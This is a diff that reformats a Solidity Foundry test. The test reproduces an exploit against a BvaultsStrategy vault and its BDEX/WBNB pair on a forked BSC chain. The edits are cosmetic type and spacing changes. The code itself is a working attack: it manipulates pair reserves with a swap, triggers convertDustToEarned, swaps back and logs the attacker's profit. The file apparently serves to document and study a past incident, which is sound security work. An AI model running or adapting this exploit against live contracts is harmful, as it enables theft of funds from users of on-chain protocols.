@@ -15,12 +15,11 @@ interface BvaultsStrategy {
 }
 
 interface BPair {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
     function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
 }
 
-
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
     BvaultsStrategy vaultsStrategy = BvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);
@@ -30,32 +29,26 @@ contract ContractTest is DSTest{
 
     function setUp() public {
         // the ankr rpc maybe dont work , please use QuickNode
-        cheats.createSelectFork("bsc", 22629431);
+        cheats.createSelectFork("bsc", 22_629_431);
     }
 
-    function testExploit() public{
+    function testExploit() public {
         address(WBNB).call{value: 34 ether}("");
-        uint amountin = WBNB.balanceOf(address(this));
+        uint256 amountin = WBNB.balanceOf(address(this));
         WBNB.transfer(address(Pair), amountin);
-        (uint BDEXReserve, uint WBNBReserve, ) = Pair.getReserves();
-        uint amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);
+        (uint256 BDEXReserve, uint256 WBNBReserve,) = Pair.getReserves();
+        uint256 amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);
         Pair.swap(amountout, 0, address(this), "");
         vaultsStrategy.convertDustToEarned();
-        uint amountBDEX = BDEX.balanceOf(address(this));
+        uint256 amountBDEX = BDEX.balanceOf(address(this));
         BDEX.transfer(address(Pair), amountBDEX);
-        (uint BDEXReserve1, uint WBNBReserve1, ) = Pair.getReserves();
-        uint amountWBNB = (998 * amountBDEX * WBNBReserve1) / (1000 * BDEXReserve1 + 998 * amountBDEX);
+        (uint256 BDEXReserve1, uint256 WBNBReserve1,) = Pair.getReserves();
+        uint256 amountWBNB = (998 * amountBDEX * WBNBReserve1) / (1000 * BDEXReserve1 + 998 * amountBDEX);
         Pair.swap(0, amountWBNB, address(this), "");
         address(WBNB).call(abi.encodeWithSignature("withdraw(uint256)", 34 * 1e18));
 
-        emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
-    receive() payable external{}
-    
-
+    receive() external payable {}
 }
